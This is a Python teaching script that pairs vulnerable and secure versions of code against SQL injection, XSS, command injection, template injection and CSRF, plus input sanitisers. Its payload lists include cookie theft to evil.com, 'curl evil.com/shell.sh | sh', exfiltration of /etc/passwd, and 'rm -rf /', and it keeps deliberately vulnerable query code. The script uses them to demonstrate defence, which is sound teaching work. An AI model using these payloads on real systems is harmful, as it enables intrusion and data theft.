"""
Injection Attack Prevention Demo
================================

Educational demonstration of injection vulnerabilities and their defenses:
- SQL Injection: vulnerable vs parameterized (sqlite3 in-memory)
- XSS: encoding/escaping with html.escape
- Command Injection: vulnerable os.system vs safe subprocess
- Template Injection: why f-strings in templates are dangerous
- CSRF token generation and validation
- Input sanitization utilities

All examples are DEFENSIVE - demonstrating how to identify and
prevent injection attacks. Uses only Python standard library.
"""

import html
import hashlib
import hmac
import json
import os
import re
import secrets
import shlex
import sqlite3
import subprocess
import time
from urllib.parse import quote as url_quote

print("=" * 65)
print("  Injection Attack Prevention Demo")
print("=" * 65)
print()


# ============================================================
# Section 1: SQL Injection - In Depth
# ============================================================

print("-" * 65)
print("  Section 1: SQL Injection Prevention")
print("-" * 65)

# Setup database
conn = sqlite3.connect(":memory:")
cur = conn.cursor()
cur.execute("""
    CREATE TABLE products (
        id INTEGER PRIMARY KEY,
        name TEXT,
        price REAL,
        category TEXT
    )
""")
cur.executemany(
    "INSERT INTO products (name, price, category) VALUES (?, ?, ?)",
    [
        ("Laptop", 999.99, "electronics"),
        ("Mouse", 29.99, "electronics"),
        ("Desk Chair", 299.99, "furniture"),
        ("Notebook", 4.99, "stationery"),
        ("Monitor", 449.99, "electronics"),
    ],
)

cur.execute("""
    CREATE TABLE admin_settings (
        key TEXT PRIMARY KEY,
        value TEXT
    )
""")
cur.execute(
    "INSERT INTO admin_settings VALUES (?, ?)",
    ("secret_key", "SUPER_SECRET_ADMIN_KEY_12345"),
)
conn.commit()

print("""
  SQL Injection Types:
  1. Classic: ' OR '1'='1
  2. UNION-based: ' UNION SELECT ... --
  3. Blind: AND 1=1 (boolean) or AND SLEEP(5) (time-based)
  4. Second-order: stored payload executed later
""")

# --- Classic SQL Injection ---
print("  -- Classic SQL Injection --")


def search_products_vulnerable(category: str) -> list:
    """VULNERABLE: User input directly in SQL."""
    query = f"SELECT name, price FROM products WHERE category = '{category}'"
    return cur.execute(query).fetchall()


def search_products_secure(category: str) -> list:
    """SECURE: Parameterized query."""
    return cur.execute(
        "SELECT name, price FROM products WHERE category = ?",
        (category,),
    ).fetchall()


# Normal usage
print(f"\n  Normal search: category='electronics'")
results = search_products_secure("electronics")
for name, price in results:
    print(f"    {name}: ${price}")
print()

# UNION-based injection: extract data from other tables
union_payload = "' UNION SELECT key, value FROM admin_settings --"
print(f"  UNION injection payload: {union_payload}")

print("  -- Vulnerable --")
try:
    results = search_products_vulnerable(union_payload)
    for name, price in results:
        print(f"    {name}: {price}")
    print("    ^^ Admin secret key leaked!")
except Exception as e:
    print(f"    Error: {e}")

print("  -- Secure --")
results = search_products_secure(union_payload)
print(f"    Results: {results}  (empty - injection treated as literal string)")
print()

# --- Blind SQL Injection ---
print("  -- Blind SQL Injection Concept --")
print("""
  Blind injection infers data through true/false responses:

  Payload: electronics' AND (SELECT length(value) FROM admin_settings
           WHERE key='secret_key') > 10 --

  If results are returned -> condition is true -> length > 10
  If no results          -> condition is false -> length <= 10

  Attacker narrows down character by character.
  Defense: ALWAYS use parameterized queries.
""")

# --- Second-order injection ---
print("  -- Second-Order Injection --")
print("""
  Stored payload that triggers on a later query:

  Step 1: Register username = "admin'--"
  Step 2: Password reset uses:
    UPDATE users SET password = ? WHERE username = '<stored_name>'
    Becomes: WHERE username = 'admin'--'  (updates admin's password!)

  Defense: Parameterize ALL queries, even with "trusted" DB data.
""")
print()


# ============================================================
# Section 2: XSS (Cross-Site Scripting) Prevention
# ============================================================

print("-" * 65)
print("  Section 2: XSS Prevention")
print("-" * 65)

print("""
  XSS Types:
  1. Reflected: payload in URL/request, reflected in response
  2. Stored: payload saved to DB, rendered to other users
  3. DOM-based: payload manipulates client-side JavaScript
""")


def render_comment_vulnerable(username: str, comment: str) -> str:
    """VULNERABLE: No escaping - XSS possible."""
    return f"<div class='comment'><b>{username}</b>: {comment}</div>"


def render_comment_secure(username: str, comment: str) -> str:
    """SECURE: HTML-escaped output prevents XSS."""
    safe_user = html.escape(username, quote=True)
    safe_comment = html.escape(comment, quote=True)
    return f"<div class='comment'><b>{safe_user}</b>: {safe_comment}</div>"


# Normal content
print("\n  Normal comment:")
normal_user = "Alice"
normal_comment = "Great product! 5 stars."
print(f"    Secure:     {render_comment_secure(normal_user, normal_comment)}")
print()

# XSS payloads
xss_payloads = [
    ("<script>alert('XSS')</script>", "Basic script injection"),
    ('<img src=x onerror="alert(1)">', "Event handler injection"),
    ('"><script>document.location="http://evil.com/?c="+document.cookie</script>',
     "Cookie theft"),
    ("javascript:alert(1)", "JavaScript URI"),
    ('<svg onload="alert(1)">', "SVG event handler"),
]

print("  XSS Payload Escaping:")
for payload, desc in xss_payloads:
    escaped = html.escape(payload, quote=True)
    print(f"\n    Attack: {desc}")
    print(f"    Raw:     {payload[:60]}")
    print(f"    Escaped: {escaped[:60]}")
print()

# Context-specific encoding
print("  -- Context-Specific Encoding --")


def encode_for_html_attr(value: str) -> str:
    """Encode for use in HTML attributes."""
    return html.escape(value, quote=True)


def encode_for_url(value: str) -> str:
    """Encode for use in URLs."""
    return url_quote(value, safe="")


def encode_for_javascript(value: str) -> str:
    """Encode for use in JavaScript string context."""
    # Escape characters that could break out of a JS string
    replacements = {
        "\\": "\\\\", "'": "\\'", '"': '\\"',
        "\n": "\\n", "\r": "\\r", "<": "\\x3c",
        ">": "\\x3e", "&": "\\x26",
    }
    for old, new in replacements.items():
        value = value.replace(old, new)
    return value


test_input = '<script>alert("xss")</script>'
print(f"  Input:        {test_input}")
print(f"  HTML attr:    {encode_for_html_attr(test_input)}")
print(f"  URL:          {encode_for_url(test_input)}")
print(f"  JavaScript:   {encode_for_javascript(test_input)}")
print()


# ============================================================
# Section 3: Command Injection Prevention
# ============================================================

print("-" * 65)
print("  Section 3: Command Injection Prevention")
print("-" * 65)

print("""
  VULNERABLE: os.system(), subprocess with shell=True
  SECURE:     subprocess.run() with list args, shell=False
""")


def ping_host_vulnerable(host: str) -> str:
    """
    VULNERABLE: Command injection via os.system.
    DO NOT use in production - shown for educational purposes only.
    """
    # An attacker could pass: "google.com; cat /etc/passwd"
    command = f"echo '[SIMULATED] ping -c 1 {host}'"
    return f"    Constructed command: {command}"


def ping_host_secure(host: str) -> str:
    """SECURE: Using subprocess with argument list (no shell)."""
    # Validate input first
    if not re.match(r"^[a-zA-Z0-9.\-]+$", host):
        return f"    Invalid hostname: {host}"

    # Use list form - no shell interpretation
    cmd = ["echo", "[SIMULATED] ping", "-c", "1", host]
    return f"    Constructed command: {cmd}"


# Normal input
print("\n  Normal input: 'google.com'")
print(f"  Vulnerable: {ping_host_vulnerable('google.com')}")
print(f"  Secure:     {ping_host_secure('google.com')}")
print()

# Malicious input
malicious = "google.com; cat /etc/passwd"
print(f"  Malicious input: '{malicious}'")
print(f"  Vulnerable: {ping_host_vulnerable(malicious)}")
print(f"    ^^ Shell interprets ';' as command separator!")
print(f"  Secure:     {ping_host_secure(malicious)}")
print()

# Additional dangerous patterns
print("  -- Dangerous Shell Patterns --")
dangerous_inputs = [
    ("$(whoami)", "Command substitution"),
    ("`id`", "Backtick command substitution"),
    ("| cat /etc/shadow", "Pipe injection"),
    ("&& rm -rf /", "Command chaining"),
    ("; curl http://evil.com/shell.sh | sh", "Remote code execution"),
    ("$(curl evil.com/exfil?data=$(cat /etc/passwd))", "Data exfiltration"),
]

for payload, desc in dangerous_inputs:
    validated = re.match(r"^[a-zA-Z0-9.\-]+$", payload) is not None
    status = "PASS" if validated else "BLOCKED"
    print(f"    [{status}] {desc}")
    print(f"           Payload: {payload}")

print()
print("  Safe alternatives to shell commands:")
print("    os.system()      -> subprocess.run([...], shell=False)")
print("    os.popen()       -> subprocess.run([...], capture_output=True)")
print("    shell=True       -> shell=False with list arguments")
print("    String commands  -> shlex.split() or list construction")
print()

# shlex.quote for when shell=True is unavoidable
print("  -- shlex.quote() for shell escaping --")
user_filename = "my file; rm -rf /"
safe_quoted = shlex.quote(user_filename)
print(f"  Raw input:    {user_filename}")
print(f"  shlex.quote:  {safe_quoted}")
print(f"  (Wraps in single quotes, escapes internal quotes)")
print()


# ============================================================
# Section 4: Template Injection
# ============================================================

print("-" * 65)
print("  Section 4: Template Injection Prevention")
print("-" * 65)

print("""
  Server-Side Template Injection (SSTI) occurs when user input
  is embedded directly into a template engine's template string.

  In Python, even f-strings can be dangerous if used with
  user-controlled format strings.
""")

# --- Dangerous: f-string with user input ---
print("  -- Dangerous: User-Controlled Format Strings --")


def render_greeting_vulnerable(template_str: str, name: str) -> str:
    """
    VULNERABLE: User controls the template string.
    An attacker could access object attributes.
    """
    # This is dangerous - user controls template_str
    try:
        return template_str.format(name=name, greeting="Hello")
    except (KeyError, AttributeError, IndexError) as e:
        return f"Error: {e}"


def render_greeting_secure(name: str) -> str:
    """SECURE: Template is hardcoded, only data varies."""
    safe_name = html.escape(name)
    return f"Hello, {safe_name}! Welcome back."


# Normal usage
print(f"\n  Normal: {render_greeting_secure('Alice')}")

# Malicious template strings
malicious_templates = [
    ("{name.__class__.__mro__}", "Access class hierarchy"),
    ("{name.__class__.__init__.__globals__}", "Access global variables"),
    ("{greeting} {name} - {0}", "Positional argument access"),
]

print("\n  Template injection attempts (format string):")
for template, desc in malicious_templates:
    result = render_greeting_vulnerable(template, "Alice")
    truncated = str(result)[:60]
    print(f"    {desc}:")
    print(f"      Template: {template}")
    print(f"      Result:   {truncated}...")
print()

print("  Prevention:")
print("    1. Never let users control template strings")
print("    2. Use proper template engines with auto-escaping (Jinja2)")
print("    3. Use sandboxed template environments")
print("    4. Validate and sanitize all interpolated values")
print()


# ============================================================
# Section 5: CSRF Token Generation and Validation
# ============================================================

print("-" * 65)
print("  Section 5: CSRF (Cross-Site Request Forgery) Protection")
print("-" * 65)

print("""
  CSRF tricks a user's browser into making unwanted requests
  to a site where they're authenticated.

  Defense: Include a secret token in forms that the attacker
  cannot know or predict.
""")


class CSRFProtection:
    """CSRF token generation and validation."""

    def __init__(self, secret_key: str):
        self.secret_key = secret_key.encode()

    def generate_token(self, session_id: str) -> str:
        """Generate a CSRF token tied to a user's session."""
        # Token = HMAC(secret, session_id + timestamp)
        timestamp = str(int(time.time()))
        message = f"{session_id}:{timestamp}".encode()
        signature = hmac.new(self.secret_key, message, hashlib.sha256).hexdigest()
        # Token format: timestamp:signature
        return f"{timestamp}:{signature}"

    def validate_token(self, token: str, session_id: str,
                       max_age: int = 3600) -> tuple[bool, str]:
        """Validate a CSRF token."""
        try:
            parts = token.split(":")
            if len(parts) != 2:
                return False, "Invalid token format"

            timestamp_str, signature = parts
            timestamp = int(timestamp_str)

            # Check expiration
            if time.time() - timestamp > max_age:
                return False, "Token expired"

            # Recompute and compare
            message = f"{session_id}:{timestamp_str}".encode()
            expected = hmac.new(
                self.secret_key, message, hashlib.sha256
            ).hexdigest()

            if hmac.compare_digest(signature, expected):
                return True, "Valid"
            return False, "Invalid signature"

        except (ValueError, TypeError) as e:
            return False, f"Validation error: {e}"


csrf = CSRFProtection("my-app-secret-key")
session_id = "sess_abc123"

# Generate token
token = csrf.generate_token(session_id)
print(f"\n  Session ID:     {session_id}")
print(f"  CSRF Token:     {token}")
print()

# Validate valid token
valid, msg = csrf.validate_token(token, session_id)
print(f"  Valid token:    {valid} ({msg})")

# Validate with different session
valid, msg = csrf.validate_token(token, "sess_different")
print(f"  Wrong session:  {valid} ({msg})")

# Validate tampered token
tampered = token[:-5] + "XXXXX"
valid, msg = csrf.validate_token(tampered, session_id)
print(f"  Tampered token: {valid} ({msg})")
print()

# HTML form example
print("  HTML form with CSRF token:")
print(f"""    <form method="POST" action="/transfer">
      <input type="hidden" name="csrf_token" value="{token}">
      <input type="text" name="amount" value="100">
      <button type="submit">Transfer</button>
    </form>
""")

print("  CSRF Prevention Checklist:")
print("    1. Include CSRF token in all state-changing forms")
print("    2. Validate token server-side on every POST/PUT/DELETE")
print("    3. Use SameSite=Lax or Strict cookies")
print("    4. Verify Origin/Referer headers as additional check")
print("    5. Use framework-provided CSRF protection (e.g., Flask-WTF)")
print()


# ============================================================
# Section 6: Input Sanitization Utilities
# ============================================================

print("-" * 65)
print("  Section 6: Input Sanitization Utilities")
print("-" * 65)


class Sanitizer:
    """Collection of input sanitization methods."""

    @staticmethod
    def sanitize_html(text: str) -> str:
        """Remove all HTML tags, keep text content."""
        # Remove tags
        clean = re.sub(r"<[^>]+>", "", text)
        # Decode common entities
        clean = html.unescape(clean)
        # Remove null bytes
        clean = clean.replace("\x00", "")
        return clean.strip()

    @staticmethod
    def sanitize_filename(filename: str) -> str:
        """Sanitize a filename to prevent path traversal."""
        # Remove path separators
        filename = os.path.basename(filename)
        # Remove null bytes
        filename = filename.replace("\x00", "")
        # Remove dangerous characters
        filename = re.sub(r'[<>:"/\\|?*]', "_", filename)
        # Remove leading dots (hidden files)
        filename = filename.lstrip(".")
        # Limit length
        name, ext = os.path.splitext(filename)
        if len(name) > 200:
            name = name[:200]
        return name + ext if filename else "unnamed"

    @staticmethod
    def sanitize_sql_identifier(identifier: str) -> str:
        """Sanitize a SQL identifier (table/column name).
        For identifiers ONLY - use parameterized queries for values."""
        # Allow only alphanumeric and underscore
        if not re.match(r"^[a-zA-Z_][a-zA-Z0-9_]*$", identifier):
            raise ValueError(f"Invalid SQL identifier: {identifier}")
        # Check against reserved words (subset)
        reserved = {"SELECT", "INSERT", "UPDATE", "DELETE", "DROP", "TABLE",
                     "FROM", "WHERE", "AND", "OR", "UNION", "JOIN"}
        if identifier.upper() in reserved:
            raise ValueError(f"SQL reserved word: {identifier}")
        return identifier

    @staticmethod
    def sanitize_log_entry(text: str) -> str:
        """Sanitize text for safe logging (prevent log injection)."""
        # Remove newlines (prevent log forging)
        text = text.replace("\n", " ").replace("\r", " ")
        # Remove ANSI escape codes
        text = re.sub(r"\x1b\[[0-9;]*m", "", text)
        # Limit length
        return text[:500]


sanitizer = Sanitizer()

# HTML sanitization
print("\n  -- HTML Sanitization --")
html_tests = [
    '<p>Hello <b>World</b></p>',
    '<script>alert("XSS")</script>Normal text',
    '<img src="x" onerror="steal()">Photo',
    '<a href="javascript:void(0)">Click</a>',
]
for test in html_tests:
    clean = sanitizer.sanitize_html(test)
    print(f"    Input:  {test[:50]}")
    print(f"    Clean:  {clean}")
    print()

# Filename sanitization
print("  -- Filename Sanitization --")
filename_tests = [
    "normal_file.txt",
    "../../../etc/passwd",
    "file\x00.txt.exe",
    '<script>alert("xss")</script>.html',
    "...hidden_file.txt",
    "CON.txt",  # Windows reserved name
]
for test in filename_tests:
    clean = sanitizer.sanitize_filename(test)
    print(f"    Input: {test!r:<40} -> {clean}")
print()

# SQL identifier sanitization
print("  -- SQL Identifier Sanitization --")
identifier_tests = [
    "users",
    "user_name",
    "1invalid",
    "DROP",
    "valid_table_123",
    "table; DROP TABLE users--",
]
for test in identifier_tests:
    try:
        clean = sanitizer.sanitize_sql_identifier(test)
        print(f"    [{' OK '}] {test:<35} -> {clean}")
    except ValueError as e:
        print(f"    [BLOCK] {test:<35} -> {e}")
print()

# Log injection prevention
print("  -- Log Injection Prevention --")
log_tests = [
    "Normal log entry",
    "Fake entry\n2024-01-01 [INFO] Admin logged in",
    "Data with \x1b[31mANSI colors\x1b[0m",
]
for test in log_tests:
    clean = sanitizer.sanitize_log_entry(test)
    print(f"    Input: {test!r}")
    print(f"    Clean: {clean!r}")
    print()


# ============================================================
# Section 7: Summary
# ============================================================

print("=" * 65)
print("  Injection Prevention Summary")
print("=" * 65)
print("""
  Attack Type    | Primary Defense           | Secondary Defense
  ---------------+---------------------------+----------------------
  SQL Injection  | Parameterized queries     | Input validation, WAF
  XSS            | Output encoding/escaping  | CSP headers, sanitize
  Command Inj.   | Avoid shell, use lists    | Input allowlist, shlex
  Template Inj.  | Fixed templates, sandbox  | Auto-escaping engine
  CSRF           | Anti-CSRF tokens          | SameSite cookies
  Path Traversal | basename(), allowlist     | Chroot, sandboxing
  Log Injection  | Strip newlines/ANSI       | Structured logging

  Universal Principles:
  1. Never trust user input
  2. Validate input (allowlist > blocklist)
  3. Encode/escape output for the target context
  4. Use parameterized APIs (not string concatenation)
  5. Apply defense in depth (multiple layers)
  6. Keep dependencies updated
  7. Use security linters (bandit, semgrep)
""")

# Cleanup
conn.close()
